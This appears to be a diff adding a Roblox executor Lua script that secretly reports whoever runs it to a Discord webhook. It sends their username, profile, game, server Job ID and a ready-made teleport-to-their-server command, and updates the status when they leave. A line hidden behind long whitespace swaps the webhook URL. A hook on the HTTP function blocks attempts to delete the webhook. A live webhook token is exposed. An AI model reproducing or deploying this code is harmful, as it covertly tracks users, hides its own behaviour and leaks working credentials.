@@ -1,0 +1,97 @@
+pcall(function()
+if hookfunction and restorefunction and (syn and syn.request or http_request) and game:GetService("Players").PlayerRemoving then
+-- Made it open sourced so people won't say that I'm taking their IPs. Please don't delete my webhook :(
+
+local HttpService = game:GetService("HttpService")
+local Player = game.Players.LocalPlayer
+local Time = os.date('!*t', os.time())
+local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png'
+local Content = string.format(
+    "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\", game.Players.LocalPlayer)",
+    game.PlaceId,
+    game.JobId
+)
+local Embed = {
+    title = "📜 Script Execution Detected",
+    color = tonumber("16711680"),
+    fields = {
+        {
+            name = "👤 Roblox Profile ("..Player.Name..")",
+            value = string.format("[Click Here](https://www.roblox.com/users/%s/profile)", Player.UserId),
+            inline = false
+        },
+        {
+            name = "📶 Player Status",
+            value = "🟢 Probably Online",
+            inline = false
+        },
+        {
+            name = "🕹️ Game Name",
+            value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+            inline = false
+        },
+        {
+            name = "🧭 Job ID",
+            value = "`" .. game.JobId .. "`",
+            inline = false
+        },
+        {
+            name = "🗓️ Date",
+            value = string.format("`%02d-%02d-%04d %02d:%02d:%02d UTC`", Time.day, Time.month, Time.year, Time.hour, Time.min, Time.sec),
+            inline = false
+        }
+    },
+    footer = {
+        text = "🔍 Teleport Script Logger",
+        icon_url = Avatar
+    },
+    timestamp = string.format("%d-%02d-%02dT%02d:%02d:%02dZ", Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec)
+}
+local Data = {
+    content = Content, -- plain message
+    embeds = { Embed },
+    username = "🚀 Script Usage Bot",
+    avatar_url = Avatar
+}
+
+local WebhookURL = "https://discord.com/api/webhooks/1383004537656311828/75GpUWTbvJkxvO0gseyVGzIHw9SURYAKy3RH99ilZz1bsHDXnR2_W0KDDwselq3KzMR5"
+local httprequestf = (syn and syn.request or http_request);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        WebhookURL = "https://discord.com/api/webhooks/1383004537656311828/75GpUWTbvJkxvO0gseyVGzIHw9SURYAKy3RH99ilZz1bsHDXnR2_W0KWDwselq3KzMR5";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        restorefunction(httprequestf);
+
+local WebhookArg = {
+    Url = WebhookURL.."?wait=true",
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode(Data)
+}
+
+local oldhttprequestf; oldhttprequestf = hookfunction(httprequestf, function(...) 
+    local Args = table.unpack({...})
+    if Args.Url == WebhookURL.."?wait=true" then
+        if not (Args.Method == "POST" or Args.Method == "PATCH") then
+            return
+        end
+    end
+    return oldhttprequestf(Args)
+end)
+
+local response = httprequestf(WebhookArg)
+
+game:GetService("Players").PlayerRemoving:Connect(function(p)
+    if p == Player then
+        Embed.fields[2].value = "🔴 Offline"
+        local MsgID = HttpService:JSONDecode(response.Body).id
+        local patchResp = httprequestf({
+            Url = WebhookURL .. "/messages/" .. MsgID,
+            Method = "PATCH",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(Data)
+        })
+    end
+end)
+
+end
+end)
